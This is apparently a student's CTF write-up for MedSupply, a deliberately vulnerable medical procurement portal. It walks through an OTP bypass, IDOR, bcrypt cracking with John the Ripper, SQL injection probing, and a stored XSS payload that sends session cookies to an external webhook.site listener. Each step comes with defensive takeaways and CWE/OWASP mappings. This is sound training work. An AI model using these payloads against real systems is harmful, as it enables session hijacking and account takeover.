# Day 16 — CTF Challenge Revision & Takeaways

**MedSupply Pentest Walkthrough, Vulnerability Chain Analysis & Key Learnings**

**Date:** Sunday May 10, 2026

---

## Overview

Today's session was a hands-on CTF challenge on a deliberately vulnerable web application called **MedSupply** — a medical procurement portal running on `35.170.201.155`. The objective was to find 5 flags in the format `FLAG{...}` using real-world attack techniques covered throughout the program.

**Final score: 4 / 5 flags found**

| # | Flag                                         | Technique                                        |
| - | -------------------------------------------- | ------------------------------------------------ |
| 1 | `FLAG{Fu33ing_Wins}`                         | OTP bypass + hidden internal API                 |
| 2 | `FLAG{Broken_Access_Control}`                | IDOR via public feed UUID leak                   |
| 3 | `FLAG{Horizontal_priv_Esc}`                  | bcrypt hash cracking + login as another hospital |
| 4 | `FLAG{Blind_XSS_Account_TakeOver}`           | Stored XSS → support cookie exfiltration         |
| 5 | *(SQL Injection → MySQL dump — in progress)* | SQLi in `/support/search`                        |

**Writeup PDF:** submitted to GitHub at `Submissions/sofonyas/MedSupply-CTF-Writeup-Final.pdf`

---

# The Attack Chain — How the Flags Connected

The challenge was intentionally designed as a **vulnerability chain**, where each weakness exposed the next attack surface.

```text
Recon (nmap)
    ↓
Register + Login
    ↓
OTP Bypass (response manipulation)     → FLAG 1
    ↓
Authenticated session → Recursive ffuf
    ↓
/internal/api/account/details discovered
    ↓
/api/public-orders leaks UUIDs
    ↓
IDOR — substitute other hospitals' UUIDs  → FLAG 2
    ↓
Leaked bcrypt hashes → John the Ripper cracking
    ↓
Login as Addis General Hospital            → FLAG 3
    ↓
Stored XSS in /support/submit
    ↓
Support bot views ticket → cookie exfiltrated
    ↓
Session hijack → /support/dashboard        → FLAG 4
    ↓
/support/search SQLi → MySQL dump          → FLAG 5 (attempted)
```

---

# Flag 1 — OTP Bypass via Response Manipulation

## Vulnerability

**Improper authentication state validation**

The application issued a valid session cookie *before* OTP verification completed. OTP acted only as a frontend/UI gate.

## Exploitation

During OTP verification:

1. Intercept response in Burp Suite
2. Modify:

```http
HTTP/1.1 200 OK
```

to:

```http
HTTP/1.1 302 Found
Location: /dashboard
```

3. Browser followed redirect
4. Server accepted authenticated session

## Root Cause

The backend never verified:

```text
session.is_otp_verified == true
```

before granting access to authenticated routes.

The application trusted the client-side flow instead of enforcing state server-side.

## Key Takeaways

* OTP must be enforced server-side
* Never trust redirect logic as an access control mechanism
* Always test:

```text
Can I directly browse to authenticated endpoints before completing MFA?
```

## Classification

| Standard | Mapping                                             |
| -------- | --------------------------------------------------- |
| CWE      | CWE-287 — Improper Authentication                   |
| OWASP    | A07:2021 — Identification & Authentication Failures |

---

# Flag 2 — IDOR / BOLA

## Vulnerability

**Broken Object Level Authorization**

The endpoint:

```http
/internal/api/account/details?user_id=
```

only checked:

```text
Is the requester logged in?
```

It never checked:

```text
Does the requester own this object?
```

## Exploitation

The public endpoint:

```http
/api/public-orders
```

leaked:

```json
{
  "requesting_hospital_id": "UUID"
}
```

Those UUIDs were then replayed against:

```http
/internal/api/account/details?user_id=<UUID>
```

Result:

* other hospitals' records
* bcrypt password hashes
* sensitive internal information

## Why UUIDs Failed

The developers assumed:

```text
UUID = secret
```

But UUIDs became public through another endpoint.

This demonstrates:

```text
Identifier entropy is NOT authorization
```

## Key Takeaways

* Every object access requires ownership validation
* Public endpoints often leak internal references
* UUIDs reduce guessing but do not replace authorization checks

## Classification

| Standard  | Mapping                                                    |
| --------- | ---------------------------------------------------------- |
| CWE       | CWE-639 — Authorization Bypass Through User-Controlled Key |
| OWASP     | A01:2021 — Broken Access Control                           |
| OWASP API | API1 — BOLA                                                |

---

# Flag 3 — Hash Cracking & Horizontal Privilege Escalation

## Vulnerability Chain

1. IDOR leaked bcrypt hashes
2. Weak password selected
3. Offline cracking succeeded

## Cracking Process

Hash:

```text
$2b$08$...
```

Cracked with:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Recovered password:

```text
30secondstomars
```

## Why It Worked

### Failure 1 — Sensitive Data Exposure

The API returned:

```json
"password_hash": "$2b$..."
```

Password hashes should never appear in client-facing responses.

### Failure 2 — Weak Password

bcrypt is resistant to brute force, but weak dictionary passwords still fall quickly under wordlist attacks.

## Horizontal vs Vertical Escalation

### Horizontal

```text
Hospital A → Hospital B account
```

### Vertical

```text
Hospital user → Admin/support role
```

This flag demonstrated horizontal escalation.

## Key Takeaways

* bcrypt is strong only if passwords are strong
* APIs must never expose hashes
* Offline cracking eliminates rate limits entirely

## Classification

| Standard | Mapping                                     |
| -------- | ------------------------------------------- |
| CWE      | CWE-200 — Exposure of Sensitive Information |
| CWE      | CWE-916 — Weak Password Protection          |
| OWASP    | A02:2021 — Cryptographic Failures           |

---

# Flag 4 — Blind XSS & Session Hijacking

## Vulnerability

Stored XSS in a support/admin-viewed interface.

## Exploitation Flow

1. Submit malicious support ticket
2. Support bot automatically reviews ticket
3. Payload executes in support user's browser
4. Session cookie exfiltrated to external listener
5. Reuse stolen cookie for authenticated support access

Payload used:

```html
<img src=x onerror="fetch('https://webhook.site/YOUR-ID?c='+document.cookie)">
```

## Why It Was “Blind”

The payload executed:

* in another user's browser
* outside the attacker's visibility

Confirmation came only through:

```text
out-of-band callback
```

## Why Session Theft Worked

Cookie:

```http
connect.sid
```

was missing:

```http
HttpOnly
```

Therefore:

```javascript
document.cookie
```

returned the session token successfully.

## Security Impact

XSS enabled:

* session hijacking
* privilege escalation
* support dashboard access
* authenticated attack surface expansion

## Key Takeaways

* Stored XSS in admin/support interfaces is extremely dangerous
* HttpOnly dramatically reduces XSS impact
* Output encoding must occur on every rendered user-controlled field
* Blind XSS is common in ticketing systems and admin panels

## Classification

| Standard | Mapping                            |
| -------- | ---------------------------------- |
| CWE      | CWE-79 — Cross-Site Scripting      |
| OWASP    | A03:2021 — Injection               |
| OWASP    | A07:2021 — Authentication Failures |

---

# Flag 5 — SQL Injection (In Progress)

## Vulnerability

SQL injection in:

```http
/support/search?query=
```

Accessible only after:

```text
support session hijack
```

## Initial Confirmation

Payload:

```sql
' OR '1'='1
```

produced altered query behavior confirming injection.

## Goal

Use:

```text
sqlmap
```

to:

* enumerate tables
* dump credentials
* locate final flag

## Issue Encountered

Session cookie contained:

```text
+
:
```

which were improperly parsed.

Fix:

```text
+  → %2B
:  → %3A
```

and pass cookie through:

```bash
-H "Cookie: ..."
```

instead of:

```bash
--cookie
```

## Key Takeaways

* Search endpoints are high-probability SQLi targets
* Authenticated functionality often receives less security testing
* Encoding issues can break automated exploitation tools

## Classification

| Standard | Mapping                |
| -------- | ---------------------- |
| CWE      | CWE-89 — SQL Injection |
| OWASP    | A03:2021 — Injection   |

---

# Key Methodological Lessons

## 1. Recon Drives Everything

nmap revealed:

```text
8080/tcp
```

which exposed the internal mail service leaking OTPs.

Without recon:

```text
the entire attack chain would have failed
```

---

## 2. Recursive Fuzzing Matters

Critical endpoint:

```text
/internal/api/account/details
```

was multiple layers deep.

Without:

```bash
ffuf -recursion
```

the endpoint would likely never have been discovered.

---

## 3. Read JavaScript Source Files

The endpoint:

```text
/api/public-orders
```

was discovered through client-side JavaScript inspection, not wordlists.

Frontend source review is often as valuable as fuzzing.

---

## 4. Real Pentests Depend on Chaining

No single vulnerability yielded full compromise.

The real attack path was:

```text
OTP bypass
→ IDOR
→ hash leak
→ cracking
→ XSS
→ session hijack
→ SQLi
```

This mirrors real-world compromise paths.

---

## 5. Documentation Is Part of the Skill

Every step was documented with:

* Burp requests
* screenshots
* curl output
* flag evidence
* payloads
* methodology notes

Professional pentesting requires:

```text
reproducibility + reporting
```

not just exploitation.

---

# Tools Used

| Tool             | Purpose                              |
| ---------------- | ------------------------------------ |
| nmap             | Port discovery                       |
| Burp Suite       | Interception & response manipulation |
| ffuf             | Recursive endpoint discovery         |
| curl             | Manual API testing                   |
| John the Ripper  | bcrypt cracking                      |
| webhook.site     | Blind XSS callback                   |
| sqlmap           | SQL injection automation             |
| Firefox DevTools | Source review & cookie inspection    |


